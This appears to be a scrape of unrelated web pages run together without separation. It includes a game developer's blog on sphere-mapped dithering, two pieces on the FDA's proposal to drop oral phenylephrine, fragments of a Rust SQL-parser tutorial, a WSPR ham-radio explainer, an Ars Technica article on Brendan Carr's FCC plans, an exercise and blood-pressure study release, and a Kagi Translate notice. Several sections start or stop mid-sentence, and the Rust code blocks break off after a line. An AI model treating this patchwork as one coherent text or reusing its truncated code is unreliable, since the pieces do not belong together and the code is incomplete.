looking at things. When walking, so many things are changing onscreen that the swimming&nbsp;dither isn't as obvious.</p><p>With that in mind, my next attempt was&nbsp;mapping the dither pattern to the geometry indirectly by pre-rendering it onto the sides of a cube centered around the camera. The cube translates with the camera but stays oriented to the world. In the mix: little bit of screen, little bit of scene.</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraCube.png" alt="" width="400" height="296"></p><p>Dither pattern mapped to a cube centered around the camera</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraCubeMap.png" alt=""></p><p>Camera's view looking up into a corner. Mapping scaled up for clarity.</p><p>The cube's mapping works well when looking directly into the sides, and not so well when aimed into a corner. Still, the dither pattern stays perfectly fixed in 3D space as the camera rotates.&nbsp;Even rough,&nbsp;the result is&nbsp;promising.</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraCube.gif" alt=""></p><p>Thresholding scene&nbsp;with the cube-mapped dither pattern</p><p>Now we're talking. Being a post-processing pass makes this more general than texel-space mapping, which is good. The problem is now down to the particular cube mapping. An ideal mapping would have&nbsp;one texel on the cube always resolve to exactly one pixel on the screen, regardless of the camera rotation. That's not possible with a cube...</p><p><span size="5">World&nbsp;Space - Sphere Mapping</span></p><p>...but&nbsp;I got pretty close with a sphere.</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraSphereMap.png" alt=""></p><p>Mapping the dither pattern onto the inside of a sphere</p><p>Finding this particular spherical mapping took some time. There's no way to perfectly tile a square texture onto a sphere. It would've been possible to redefine the dither matrices in terms of a hexagon grid or something else that does tile on a sphere. Possible&nbsp;maybe, I didn't try. Instead, I just hacked on the square tiling&nbsp;until this carefully tweaked "rings" mapping of the original dither pattern&nbsp;gave good results.</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraSphere.gif" alt=""></p><p>Applied to the scene</p><p>Better than the cube. Still lots of aliasing. The spherically-mapped dot size is very similar to the screen pixel size - off just enough to cause moire patterns. I could feel the closeness, and a&nbsp;very simple fix for this kind of aliasing is to supersample: apply the dither thresholding at a higher resolution and downsample.</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraSphereMap2.png" alt=""></p><p>Spherically-mapped dither pattern at 2x and downsampled to 1x</p><p><img src="http://3909.co/dev/od/img/Dither2-CameraSphere2.gif" alt=""></p><p>Thresholding at 2x, then&nbsp;downsampling to 1x</p><p>This is the best I got. There are a few compromises:</p><p>&nbsp; &nbsp; <b>1</b>&nbsp;The dither pattern dots get larger and less effective at the edges of the screen<br>&nbsp; &nbsp; <b>2</b>&nbsp;The pattern isn't aligned up-down-left-right for most camera rotations<br>&nbsp; &nbsp; <b>3</b>&nbsp;The output is no longer 1-bit due to the final box-downsample</p><p>But the upside is pretty lofty:</p><p>&nbsp; &nbsp; <b>1</b> The dithering is perfectly pinned for all camera rotations. This feels slightly uncanny in-game.<br>&nbsp; &nbsp; <b>2</b> Discomfort from swimming dither is totally gone, even at fullscreen<br>&nbsp; &nbsp; <b>3</b> The pixellated style of the game is preserved</p><p>It's possible&nbsp;eliminate compromise #3 by reducing the output back to 1-bit with a simple 50% threshold. The result is&nbsp;still better than without supersampling (the triple comparison directly below is thresholded).</p><p><img src="http://3909.co/dev/od/img/Dither2-FinalCompare.gif" alt=""></p><p>Side by side, by side</p><p><img src="http://3909.co/dev/od/img/Dither2-SplitCompare.gif" alt=""></p><p>In the game's default palette</p><p><span size="5"><b>Wrapup</b></span></p><p>It feels a little weird to put 100 hours into something that won't be noticed by its absence. Exactly no one will think, "man this dithering is stable as shit. total magic going on here." I don't want to give people problems they didn't know they should have though so it was worth fixing.</p><p>The screenspace mapping with&nbsp;offset works best at 1x and the sphere mapping&nbsp;works best at 2x.&nbsp;All scene rendering is at 800x450 now (up from 640x360), which helps legibility without sacrificing the low-res style. The final game will have&nbsp;two display modes:&nbsp;</p><p><b>DIGITAL</b><br>Border-boxed, screenspace offset dither, 1-bit output</p><p><b>ANALOG</b><br>Fullscreen, sphere-mapped dither, softened&nbsp;output</p></div></div>]]></description>

<div id="readability-page-1" class="page"><div>
                      
                      
          <p><a href="https://arstechnica.com/health/2023/09/the-spectacular-downfall-of-a-common-useless-cold-medicine/">In a long-sought move</a>, the Food and Drug Administration on Thursday formally began the process of abandoning oral doses of a common over-the-counter decongestant, which the agency concluded last year is not effective at relieving stuffy noses.</p>
<p>Specifically, the FDA issued <a href="https://dps.fda.gov/omuf/ordersearch/order_otc000036">a proposed order</a> to remove oral phenylephrine from the list of drugs that drugmakers can include in over-the-counter products—also known as the OTC monograph. Once removed, drug makers will no longer be able to include phenylephrine in products for the temporary relief nasal congestion.</p>
<p>"It is the FDA’s role to ensure that drugs are safe and effective," Patrizia Cavazzoni, director of the FDA’s Center for Drug Evaluation and Research, said in a statement. "Based on our review of available data and consistent with the advice of the advisory committee, we are taking this next step in the process to propose removing oral phenylephrine because it is not effective as a nasal decongestant."</p>
<p>For now, the order is just a proposal. The FDA will open up a public comment period, and if no comments can sway the FDA's previous conclusion that the drug is useless, the agency will make the order final. Drugmakers will get a grace period to reformulate their products.</p>
<h2>Reviewed reviews</h2>
<p>The slow-moving abandonment of phenylephrine is years in the making. The decongestant was originally approved by the FDA back in 1976, but it came to prominence after 2006. That was the year when the "Combat Methamphetamine Epidemic Act of 2005" came into effect, and pseudoephedrine—the main component of Sudafed—moved behind the pharmacy counter to keep it from being used to make methamphetamine. With pseudoephedrine out of easy reach at drugstores, phenylephrine became the leading over-the-counter decongestant. And researchers had questions.</p>
<p>In 2007, an FDA panel reevaluated the drug, which allegedly works by shrinking blood vessels in the nasal passage, opening up the airway. While the panel upheld the drug's approval, it concluded that more studies were needed for a full assessment. After that, three large, carefully designed studies were conducted—two by Merck for the treatment of seasonal allergies and one by Johnson &amp; Johnson for the treatment of the common cold. All three found no significant difference between phenylephrine and a placebo.</p>

tests check wheter the parser correctly asserts the conditions the sql standard
lays out, see <a href="https://www.sqlite.org/syntax/sql-stmt.html">sqlite - sql-stmt</a>.
Specifically, either that a statement follows after the <code>EXPLAIN</code> identifier or
the <code>QUERY PLAN</code> and a statement follow.</p><p>The difference between these tests and the tests for the lexer are in the way
the assertions are made. Take a look at the code the macros produce:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>#[cfg(test)]</span>

the <code>EXPLAIN</code> statement, which - according to the sqlite documentation -
prefixes all other sql statements, hence the name. The corresponding syntax
diagram is shown below:</p><p><img src="https://xnacly.me/rust_lex_parse/sql_stmt.png" alt="sql_stmt syntax diagram"></p><p>The implementation follows this diagram. The <code>Explain</code> stmt is optional, thus
if the current token type does not match <code>Type::Keyword(Keyword::EXPLAIN)</code>, we
call the <code>sql_stmt</code> function to processes the statements on the right of
the syntax diagram.</p><p>If the token matches it gets consumed and the next check is for the second
possible path in the <code>EXPLAIN</code> diagram: <code>QUERY PLAN</code>. This requires both the
<code>QUERY</code> and the <code>PLAN</code> keywords consecutively - both are consumed.</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>impl</span><span>&lt;</span><span>'a</span><span>&gt;</span> Parser<span>&lt;</span><span>'a</span><span>&gt;</span> {

  <p>Today, the U.S. Food and Drug Administration announced it is proposing to remove oral phenylephrine as an active ingredient that can be used in over-the-counter (OTC) monograph drug products for the temporary relief of nasal congestion after an agency review of the available data determined that oral phenylephrine is not effective for this use. For now, companies may continue to market OTC monograph drug products containing oral phenylephrine as a nasal decongestant. This is a <a href="https://dps.fda.gov/omuf/ordersearch/order_otc000036">proposed order</a>. Only a final order will affect what products can be marketed. The proposed order is based on effectiveness concerns, not on safety concerns.&nbsp;</p>

<p>Currently, oral phenylephrine is widely used as a nasal decongestant active ingredient in many OTC monograph drug products. It is important to note that some products only contain oral phenylephrine as a single, active ingredient. Others contain oral phenylephrine and another active ingredient (e.g., acetaminophen or dextromethorphan), and the presence of oral phenylephrine in these medicines does not affect how other active ingredients work to treat the symptoms for which they are intended.&nbsp;</p>

<p><strong>“It is the FDA’s role to ensure that drugs are safe and effective,” said Patrizia Cavazzoni, M.D., director of the FDA’s Center for Drug Evaluation and Research (CDER). “Based on our review of available data, and consistent with the advice of the advisory committee, we are taking this next step in the process to propose removing oral phenylephrine because it is not effective as a nasal decongestant.”</strong></p>

<p>The agency conducted a comprehensive review of all available data on the safety and efficacy of oral phenylephrine, including the historical data that were used to support the determination made 30 years ago that oral phenylephrine was effective as a nasal decongestant, as well as newer clinical data on oral phenylephrine that have since become available.&nbsp;</p>

<p>Last fall, the FDA also held a Nonprescription Drug Advisory Committee meeting to discuss the ‘Generally Recognized as Safe and Effective’ (GRASE) status of oral phenylephrine as a nasal decongestant. The committee discussed new data on the effectiveness of orally administered phenylephrine and unanimously concluded that the current scientific data do not support that the recommended dosage in the OTC cold, cough, allergy, bronchodilator and antiasthmatic drug products monograph for orally administered phenylephrine’s effectiveness as a nasal decongestant.</p>

<p><strong>“Consumers should know that a range of safe and effective drugs and other treatments is available to temporarily relieve congestion symptoms due to allergies or a common cold,” said Theresa Michele, M.D., director of the Office of Nonprescription Drug Products in CDER. “Consumers can also talk to their doctor or pharmacist about ways to treat these symptoms.”</strong></p>

<p>Because a variety of different drug products may be sold under the same brand name, consumers should always read the Drug Facts label to determine which ingredients are in a medication, and to be aware of important warnings and directions for use. Phenylephrine is also an ingredient in nasal sprays to treat congestion. The FDA’s action is only related to orally administered phenylephrine and not the nasal spray form.</p>

<p>The FDA is seeking public comments on this proposed order. Instructions on how to submit comments are found in the proposed order available on OTC <a href="https://dps.fda.gov/omuf">Monographs@FDA</a>. If, after considering the comments, the FDA concludes oral phenylephrine is not effective as a nasal decongestant, the FDA will issue a final order removing oral phenylephrine from the OTC monograph, and drug products thereafter could no longer contain oral phenylephrine as a nasal decongestant. The FDA would provide manufacturers with appropriate time to either reformulate drugs containing oral phenylephrine or remove such drugs from the market.</p>

<p>Let’s start with the basics:</p>



<ul>
<li>WSPR stands for Weak Signal Propagation Reporter—a protocol implemented in a computer program used for weak-signal radio communication between hams.</li>



<li>It lets users send and receive low-power transmissions for testing MF and HF propagation paths.</li>



<li>Pronounced “whisper,” WSPR was designed and written initially by Nobel Prize winner and <strong><a href="https://www.onallbands.com/category/technical-articles/ft8/" target="_blank" rel="noopener">FT8</a></strong> creator Joe Taylor, K1JT.</li>



<li>The software code is now open source and updated by a small team.</li>
</ul>



<p>If you’ve wondered if a band is open, WSPR can tell you.</p>



<figure><img fetchpriority="high" decoding="async" width="538" height="353" src="https://www.onallbands.com/wp-content/uploads/2024/06/wspr-radio-display-screengrab.jpg" alt="wspr radio propagation display map" srcset="https://www.onallbands.com/wp-content/uploads/2024/06/wspr-radio-display-screengrab.jpg 538w, https://www.onallbands.com/wp-content/uploads/2024/06/wspr-radio-display-screengrab-300x197.jpg 300w, https://www.onallbands.com/wp-content/uploads/2024/06/wspr-radio-display-screengrab-310x203.jpg 310w" sizes="(max-width: 538px) 100vw, 538px"><figcaption>(Image/Elizabeth Klinc, KE8FMJ)</figcaption></figure>



<p>As noted by Joe Taylor, K1JT, and Bruce Walker, W1BW, in their November 2010 <em>QST</em> article, “<strong><a href="https://www.arrl.org/files/file/History/History%20of%20QST%20Volume%201%20-%20Technology/QS11-2010-Taylor.pdf" target="_blank" rel="noopener">WSPRing Around the World</a></strong>,” WSPR transmits and receives but does not support normal types of on-the-air conversation. It sends and receives specially coded, beacon-like transmissions which establish whether particular propagation paths are open. Transmissions convey a callsign, station location, and power level using a compressed data format with strong forward error correction (FEC) and narrow-band, four-tone frequency-shift-keying (FSK).</p>



<p>K1JT notes that FEC greatly improves chances of copy and reduces errors to an extremely low rate. The signal bandwidth is only 6 Hz. Combined with randomized time-sharing, this assures that dozens of WSPR signals can fit into a 200 Hz segment of each amateur band. The WSPR protocol is effective at signal-to-noise ratios as low as -28 dB in a 2500 Hz bandwidth, about 10 to 15 dB below the threshold of audibility. On most bands, typical WSPR power levels are 5W or less (sometimes significantly less).</p>



<p>As the protocol has evolved, enhancements to WSPR have included upgrades in its decoder’s sensitivity, improved ability to handle larger numbers of signals in crowded sub-bands, and better detection of false decodes.</p>



<p>To take advantage of WSPR on the amateur bands, you’ll need a radio (one with USB audio is preferred) and a computer with an Internet connection. As users have pointed out online, you don’t need to transmit. Your system can still report what it hears.</p>



<p>The standard message is &lt;callsign&gt; + &lt;4 character locator&gt; + &lt;dBm transmit power&gt;. For example, “KE8FMJ EM89 37” is a signal from station KE8FMJ in Maidenhead grid cell “EM89,” sending 37 dBm, or about 5.0W.</p>

<p>The Republican who is likely to lead the Federal Communications Commission under President-elect Donald Trump detailed how he would run the agency when he wrote a chapter for the conservative Heritage Foundation's Project 2025. Carr, a longtime opponent of net neutrality rules and other broadband regulations, has also made his views clear numerous times when opposing rulemakings initiated by the current Democratic majority.</p>
<p>If Trump makes Carr the next FCC chairman after his inauguration, the FCC is likely to ditch consumer protection initiatives, like a recently announced inquiry into data caps, and attempt to regulate Big Tech companies while reducing regulation of Internet service providers. That could include forcing Big Tech companies to pay into a fund that subsidizes ISPs' broadband network construction.</p>
<p>A Carr-led FCC could also try to punish news organizations that are perceived to be anti-Trump. Just before the election, Carr <a href="https://x.com/BrendanCarrFCC/status/1852887210330341693">alleged</a> that NBC putting Kamala Harris on <em>Saturday Night Live</em> was "a clear and blatant effort to evade the FCC's Equal Time rule," and that the FCC should <a href="https://www.foxnews.com/politics/fcc-commissioner-rips-nbc-over-harris-last-minute-snl-appearance-plainly-designed-evade-rules">consider issuing penalties</a>. Despite Carr's claim, NBC did provide equal time to the Trump campaign.</p>
<p>Carr might also try to steer money to Elon Musk's Starlink system. Carr was a vocal opponent of the FCC decision to deny SpaceX's application for $886 million in government funding and <a href="https://docs.fcc.gov/public/attachments/FCC-23-105A1.pdf">claimed</a> that "President Biden gave federal agencies a greenlight" to punish Musk after he bought Twitter.</p>
<h2>FCC chair’s power</h2>
<p>Carr became an FCC commissioner in August 2017 after being nominated by then-President Trump. Carr was previously a legal adviser to Commissioner Ajit Pai and was briefly the FCC's general counsel during Pai's first year as chair in 2017.</p>
<p>Carr's <a href="https://static.project2025.org/2025_MandateForLeadership_CHAPTER-28.pdf">Project 2025 chapter</a>, published in 2023, said "the FCC's Chairperson serves as the agency's CEO and is empowered with significant authority that is not shared with other Commissioners." The chair "sets the FCC's agenda, decides what matters the agency will vote on and when, and has authority to organize and coordinate the FCC's work," Carr wrote. Although the president's nominations for each commissioner require Senate approval, the president can appoint any sitting commissioner to the chair spot without a Senate vote.</p>

          
                      
                  </div>
                    
        
          
    
    <div>
          
          
<p>The chair does not have unlimited power, of course. Congress can expand or reduce the FCC's authority by passing new laws or eliminating existing ones. FCC decisions are routinely challenged in court, and a recent <a href="https://arstechnica.com/tech-policy/2024/06/scotus-kills-chevron-deference-giving-courts-more-power-to-block-federal-rules">Supreme Court ruling</a> limited the regulatory authority of federal agencies.</p>
<p>Carr wants the FCC to regulate less, at least when it comes to Internet service providers. "The FCC is a New Deal–era agency. Its history of regulation tends to reflect the view that the federal government should impose heavy-handed regulation rather than relying on competition and market forces to produce optimal outcomes," he wrote.</p>
<p>The FCC, he said, "should engage in a serious top-to-bottom review of its regulations and take steps to rescind any that are overly cumbersome or outdated," and "focus its efforts on creating a market-friendly regulatory environment that fosters innovation and competition from a wide range of actors, including cable-based, broadband-based, and satellite-based Internet providers."</p>
<p>Chris Lewis, president and CEO of consumer advocacy group Public Knowledge, told Ars that Carr appears to be a leading candidate for the chairmanship "because of his experience and active presence in trying to chart a course for Republicans on telecom policy," with the Project 2025 chapter being a prime example.</p>
<p>Public Knowledge generally argues that the FCC should take a bigger role in regulating Internet providers. "The public expects that there is an agency protecting consumers over communications networks and I think it would be wise for the new majorities and new administration to be clearheaded about that," Lewis said.</p>
<h2>Carr targets Big Tech and online speech</h2>
<p>The FCC should have four primary goals, Carr wrote. Those goals are "reining in Big Tech, promoting national security, unleashing economic prosperity, and ensuring FCC accountability and good governance."</p>

          
                  </div>
                    
        
          
    
    <div>
          
          
<p>On Big Tech, Carr wants to implement Trump's 2020 plan to crack down on social media websites for alleged anti-conservative bias. At the time, Trump <a href="https://arstechnica.com/tech-policy/2020/07/trumps-social-media-crackdown-called-a-monumental-waste-of-fccs-time/">formally petitioned the FCC</a> to reinterpret Section 230 of the Communications Decency Act in a way that would limit social media platforms' legal protections for hosting third-party content when the platforms take down content they consider objectionable.</p>
<p>Trump was so keen on getting this done in 2020 that he <a href="https://arstechnica.com/tech-policy/2020/08/trump-pulls-re-nomination-of-fcc-republican-who-stood-up-for-first-amendment/">withdrew his re-nomination</a> of then-Commissioner Michael O'Rielly, a Republican who took the party line on most issues but did not support Trump's attempt to punish social networks. Trump and the Senate <a href="https://arstechnica.com/tech-policy/2020/09/trump-replaces-fcc-member-in-bid-to-push-through-twitter-facebook-crackdown/">replaced O'Rielly with Nathan Simington</a>, who was a member of the Trump administration before <a href="https://arstechnica.com/tech-policy/2020/12/senate-confirms-trump-fcc-nominee-cementing-2-2-deadlock-for-biden-admin/">becoming an FCC commissioner</a> just before Trump's first term ended. Simington is another possible chairman and has similar views as Carr, but Carr has a longer tenure on the FCC and has sought the media spotlight more than Simington.</p>
<p>In the Project 2025 publication, Carr's "reining in Big Tech" section said the FCC "should issue an order that interprets Section 230 in a way that eliminates the expansive, non-textual immunities that courts have read into the statute."</p>
<p>"The FCC has an important role to play in addressing the threats to individual liberty posed by corporations that are abusing dominant positions in the market. Nowhere is that clearer than when it comes to Big Tech and its attempts to drive diverse political viewpoints from the digital town square," Carr wrote.</p>

<h2>First Amendment</h2>
<p>Lewis said Public Knowledge is worried that changes to Section 230 would harm the ability of online platforms to moderate content or choose not to moderate content, because companies could face great legal liability for those choices if 230 is weakened or scrapped.</p>
<p>O'Rielly argued in a July 2020 <a href="https://docs.fcc.gov/public/attachments/DOC-365814A1.pdf">speech</a> that apparently angered Trump that the FCC shouldn't regulate in this area. "The First Amendment protects us from limits on speech imposed by the government—not private actors—and we should all reject demands, in the name of the First Amendment, for private actors to curate or publish speech in a certain way," O'Rielly said at the time. "Like it or not, the First Amendment's protections apply to corporate entities, especially when they engage in editorial decision making."</p>

          
                  </div>
                    
        
          
    
    <div>
          
          
<p>Carr claimed in his Project 2025 chapter that "the FCC has authority to take this action because Section 230 is codified in the Communications Act," and he pointed to Supreme Court Justice Clarence Thomas' <a href="https://arstechnica.com/tech-policy/2021/04/clarence-thomas-blasts-section-230-wants-common-carrier-rules-on-twitter/">views on the law</a> as evidence that the FCC can act.</p>
<p>Carr's chapter also said the FCC should "address TikTok's threat to US national security," saying the Chinese-owned social network "provides Beijing with an opportunity to run a foreign influence campaign by determining the news and information that the app feeds to millions of Americans."</p>
<h2>Carr’s Kamala Harris complaint</h2>
<p>On November 2, Carr claimed that NBC was trying to evade the Equal Time rule by putting Democratic nominee Kamala Harris on <em>Saturday Night Live</em>. "The purpose of the rule is to avoid exactly this type of biased and partisan conduct—a licensed broadcaster using the public airwaves to exert its influence for one candidate on the eve of an election. Unless the broadcaster offered Equal Time to other qualifying campaigns," Carr wrote.</p>
<p>Carr later <a href="https://www.foxnews.com/politics/fcc-commissioner-rips-nbc-over-harris-last-minute-snl-appearance-plainly-designed-evade-rules">told Fox News</a> that "all remedies should be on the table," including "license revocations."</p>
<p>"One commissioner standing alone, there's no real consequence that I can impose at this point," he said. "You need the FCC chairperson or at least three commissioners on the FCC to agree to take action. We'll see if we end up there with this commission or otherwise."</p>
<p>Carr was wrong about the Equal Time rule, <a href="https://www.freepress.net/news/press-releases/fccs-carr-wrongly-claims-snl-appearance-violates-agencys-equal-time-rules">media advocacy group Free Press said</a> on November 3. The group pointed to an <a href="https://www.fcc.gov/sites/default/files/political_programming_fact_sheet.pdf">FCC fact sheet</a> that says the rule "does not require a station to provide opposing candidates with programs identical to the initiating candidate."</p>
<p>"Despite Carr's claim, there is no evidence that the network was trying to avoid the rules," Free Press said. "Broadcasters have no legal obligation to set aside broadcast time for opposing candidates, unless the candidates request it. Equal-opportunity requests are commonplace in the final days of a national election, and broadcasters typically honor them."</p>

    <div>
          
          
<p>NBC did <a href="https://www.latimes.com/entertainment-arts/business/story/2024-11-04/trump-campaign-gets-equal-time-from-nbc-after-harris-snl-appearance">honor a request</a> for equal time from the Trump campaign, giving him two free 60-second messages during NASCAR and NFL coverage.</p>
<h2>“Carr is desperate to become the FCC chair”</h2>
<p>Free Press co-CEO Jessica González said, "It's bizarre that a sitting FCC commissioner would engage in such a blatant and wrongheaded attempt to curry favor with a presidential candidate. But this is just the sort of reckless behavior we've come to expect from Brendan Carr. You'd expect an FCC commissioner to be familiar with his own agency's regulations. Instead Carr seems willing to concoct falsehoods if it means he'll get noticed by the former president."</p>
<p>González added, "It's no secret around Washington that Carr is desperate to become the FCC chair should Trump be elected president. First Carr wrote a chapter in the widely discredited policy platform for Project 2025, a far-right master plan to disassemble US democracy. Now he's making grossly inaccurate claims about communications law to win points with the former president."</p>
<p>Carr continued claiming that NBC violated the rule even after Trump was given free TV time. "NBC and SNL decided to bring just one candidate on less than 50 hours before Election Day," he <a href="https://x.com/BrendanCarrFCC/status/1854223937271398787">wrote on November 6</a>. "The FCC has previously addressed these types of 'last minute' situations. I encourage any candidate that does not believe that their Equal Time rights were honored to bring the issue forward to the FCC for our adjudication."</p>

<h2>Making Big Tech pay</h2>
<p>Carr wants to help Internet service providers achieve a <a href="https://arstechnica.com/tech-policy/2024/06/isps-ask-fcc-for-tax-on-big-tech-to-fund-broadband-networks-and-discounts/">long-held dream</a> of making tech companies pay for broadband network upgrades. Carr's Project 2025 chapter said the FCC should "require that Big Tech begin to contribute a fair share" into "the FCC's roughly $9 billion Universal Service Fund."</p>

          
                  </div>
                    
        
          
    
    <div>
          
          
<p>The fund has long been paid for by telecom companies, which generally pass the cost on to consumers on their telephone bills. "While Big Tech derives tremendous value from the federal government's universal service investments—using those federally supported networks to deliver their products and realize significant profits—these large corporations have avoided paying a fair share into the program," Carr wrote.</p>
<p>The Biden administration <a href="https://arstechnica.com/tech-policy/2023/05/biden-admin-wants-europe-to-reject-forced-payments-from-big-tech-to-isps/">urged Europe</a> to reject a similar idea last year, saying that payments from online platforms to ISPs would "distort competition" and undermine net neutrality. The European plan was also criticized by <a href="https://arstechnica.com/tech-policy/2023/03/meta-slams-telco-fee-proposal-says-isps-should-pay-their-own-network-costs/">Meta</a>, <a href="https://arstechnica.com/tech-policy/2022/09/google-fights-latest-attempt-to-have-big-tech-pay-for-isps-network-upgrades/">Google</a>, <a href="https://arstechnica.com/tech-policy/2023/03/netflix-fights-attempt-to-make-streaming-firms-pay-for-isp-network-upgrades/">Netflix</a>, and the Body of European Regulators for Electronic Communications (BEREC). The group of regulators from European countries <a href="https://www.berec.europa.eu/system/files/2023-05/BoR%20(23)%20131b%20Overview%20of%20BEREC%20Response%20to%20Exploratory%20Consultation.pdf">said</a> it found no evidence of "free-riding" by tech companies or evidence that ISPs' costs weren't fully covered.</p>
<p>If he becomes chair, Carr would have significant influence over which companies get money from the Universal Service Fund. Carr was angry about the FCC decision to <a href="https://arstechnica.com/tech-policy/2022/08/fcc-rejects-starlinks-886-million-grant-says-spacex-proposal-too-risky/">reject Starlink's application</a> to receive $885.51 million in broadband funding.</p>
<p>The grant was tentatively awarded during Pai's tenure but canceled in a 2022 ruling that called Starlink a "nascent LEO [low Earth orbit] satellite technology" with "recognized capacity constraints." The Biden-era FCC had earlier pointed out that Pai's system for choosing grant winners led to "complaints that the program was poised to fund broadband to parking lots and well-served urban areas."</p>
<p>When the FCC <a href="https://arstechnica.com/tech-policy/2023/12/spacex-blasts-fcc-as-it-refuses-to-reinstate-starlinks-886-million-grant/">rejected Starlink's appeal</a> in 2023, Carr said the FCC decision "certainly fits the Biden Administration's pattern of regulatory harassment."&nbsp;The FCC, Carr said, is one of a "growing list of administrative agencies that are taking action against Elon Musk's businesses." He alleged that "the Biden Administration is choosing to prioritize its political and ideological goals at the expense of connecting Americans."</p>

        <div>
          
          
<h2>Killing broadband regulation</h2>
<p>Carr also wants to help ISPs avoid regulation. A Carr-led FCC would likely drop the agency's <a href="https://arstechnica.com/tech-policy/2023/10/is-net-neutrality-doomed-at-supreme-court-fcc-and-isps-prepare-for-epic-battle/">legal defense of its net neutrality rules</a>, and that defense is <a href="https://arstechnica.com/tech-policy/2024/08/fcc-suffers-major-setback-in-attempt-to-defend-net-neutrality-rules/">off to a rocky start</a> in court already.</p>
<p>California and other states have been <a href="https://arstechnica.com/tech-policy/2024/04/fcc-wont-block-california-net-neutrality-law-says-states-can-experiment/">regulating net neutrality</a> themselves since the Pai FCC eliminated Obama-Era rules that prohibited paid prioritization and blocking or throttling of lawful traffic. The next FCC chair could try to revive Pai's attempt to preempt state laws, which was <a href="https://arstechnica.com/tech-policy/2019/10/why-ajit-pais-unhinged-net-neutrality-repeal-was-upheld-by-judges/">rejected in court</a> in 2019.</p>
<p>Carr would likely try to halt or unwind other initiatives that Democratic Chairwoman Jessica Rosenworcel has undertaken to help broadband consumers. Carr dissented last year in the FCC's <a href="https://arstechnica.com/tech-policy/2023/11/cable-lobby-and-ted-cruz-are-disappointed-as-fcc-bans-digital-discrimination/">3-2 decision to impose rules</a> that prohibit discrimination in access to broadband services. Carr described Rosenworcel's discrimination proposal as "President Biden's plan to give the administrative state effective control of all Internet services and infrastructure in the US," claiming it was "motivated by an ideology of government control that is not compatible with the fundamental precepts of free market capitalism."</p>
<p>Rosenworcel last month <a href="https://arstechnica.com/tech-policy/2024/10/fcc-republican-opposes-regulation-of-data-caps-with-analogy-to-coffee-refills/">announced a formal inquiry into data caps</a> to consider their effect on consumers and whether the FCC has authority to regulate them.&nbsp;In dissent, Carr <a href="https://docs.fcc.gov/public/attachments/FCC-24-106A3.pdf">said</a>, "I cannot support the Biden-Harris Administration's inexorable march towards rate regulation," and that "the FCC plainly does not have the legal authority" to regulate data caps.</p>
<p>He also said that data caps can be good for Internet users. "Prohibiting customers from choosing to purchase plans with data caps—which are more affordable than unlimited ones—necessarily regulates the service rates they are paying for," Carr said.</p>
<p>Lewis told Ars that ditching the data cap inquiry means that "we will miss out on opportunities to look at when a broadband provider preferences its own streaming service or other service over a competitor's. Ending the data caps probe will mean we will not be able to look at those sorts of specific cases and see if there is an anticompetitive practice."</p>

<div id="readability-page-1" class="page"><div>
		
		
			<p>New research suggests that adding a small amount of physical activity – such as uphill walking or stair-climbing – into your day may help to lower blood pressure.</p>
<p>The study, published in Circulation, was carried out by experts from the <a href="https://www.propassconsortium.org/">ProPASS (Prospective Physical Activity, Sitting and Sleep) Consortium</a>, an international academic collaboration led by the University of Sydney and <a href="https://www.ucl.ac.uk/">University College London</a> (UCL).&nbsp;</p>
<p>Just five minutes of activity a day was estimated to potentially reduce blood pressure, while replacing sedentary behaviours with 20-27 minutes of exercise per day, including uphill walking, stair-climbing, running and cycling, was also estimated to lead to a clinically meaningful reduction in blood pressure.</p>
<p>Joint senior author <a href="https://www.sydney.edu.au/medicine-health/about/our-people/academic-staff/emmanuel-stamatakis.html">Professor Emmanuel Stamatakis,</a> Director of the ProPASS Consortium from the <a href="https://www.sydney.edu.au/charles-perkins-centre/">Charles Perkins Centre</a> said: “High blood pressure is one of the biggest health issues globally, but unlike some major causes of cardiovascular mortality there may be relatively accessible ways to tackle the problem in addition to medication.”</p>
<p>“The finding that doing as little as five extra minutes of exercise per day could be associated with measurably lower blood pressure readings emphasises how powerful short bouts of higher intensity movement could be for blood pressure management.”</p>
<p>Hypertension, or a consistent elevated blood pressure level, is one of the biggest causes of premature death globally. Affecting 1.28 billion adults around the world, it can lead to stroke, heart attack, heart failure, kidney damage and many other health problems, and is often described as the ‘silent killer’ due to its lack of symptoms.</p>
<p>The research team analysed health data from 14,761 volunteers in five countries to see how replacing one type of movement behaviour with another across the day is associated with blood pressure.</p>
<p>Each participant used a wearable accelerometer device on their thigh to measure their activity and blood pressure throughout the day and night.&nbsp;</p>
<p>Daily activity was split into six categories: sleep, sedentary behaviour (such as sitting), slow walking, fast walking, standing, and more vigorous exercise such as running, cycling or stair climbing.</p>
<p>The team modelled statistically what would happen if an individual changed various amounts of one behaviour for another in order to estimate the effect on blood pressure for each scenario and found that replacing sedentary behaviour with 20-27 minutes of exercise per day could potentially reduce cardiovascular disease by up to 28 percent at a population level.</p>
<p>First author <a href="https://profiles.ucl.ac.uk/58333-jo-blodgett">Dr Jo Blodgett</a> from the <a href="https://www.ucl.ac.uk/surgery/">Division of Surgery and Interventional Science</a> at UCL and the <a href="https://www.iseh.co.uk/">Institute of Sport, Exercise and Health</a> said: “Our findings suggest that, for most people, exercise is key to reducing blood pressure, rather than less strenuous forms of movement such as walking.</p>
<p>“The good news is that whatever your physical ability, it doesn’t take long to have a positive effect on blood pressure. What’s unique about our exercise variable is that it includes all exercise-like activities, from running for a bus or a short cycling errand, many of which can be integrated into daily routines.</p>
<p>“For those who don’t do a lot of exercise, walking did still have some positive benefits for blood pressure. But if you want to change your blood pressure, putting more demand on the cardiovascular system through exercise will have the greatest effect.”</p>
<p>Professor Mark Hamer, joint senior author of the study and ProPASS Deputy Director from UCL, said: “Our findings show how powerful research platforms like the ProPASS consortium are for identifying relatively subtle patterns of exercise, sleep, and sedentary behaviour, that have&nbsp; significant clinical and public health importance.”</p>

<p>We will be bringing Kagi Translate soon inside Kagi Search as a widget for instant translation inside search results.</p>

<p>Kagi Translate is free for everyone.

Kagi members get direct access without captchas, integrating seamlessly with their existing workflow.</p>

<h4>Limitations</h4>

<p>We do not translate dynamically created content (eg. pages where content is loaded with JavaScript) or paywalled pages.</p>

<p>Kagi Translate uses a combination of LLMs, selecting and optimizing the best output for each task. While this creates immensey powerful translation capabilities, it can occasionally lead to quirks that we’re actively working to resolve.</p>

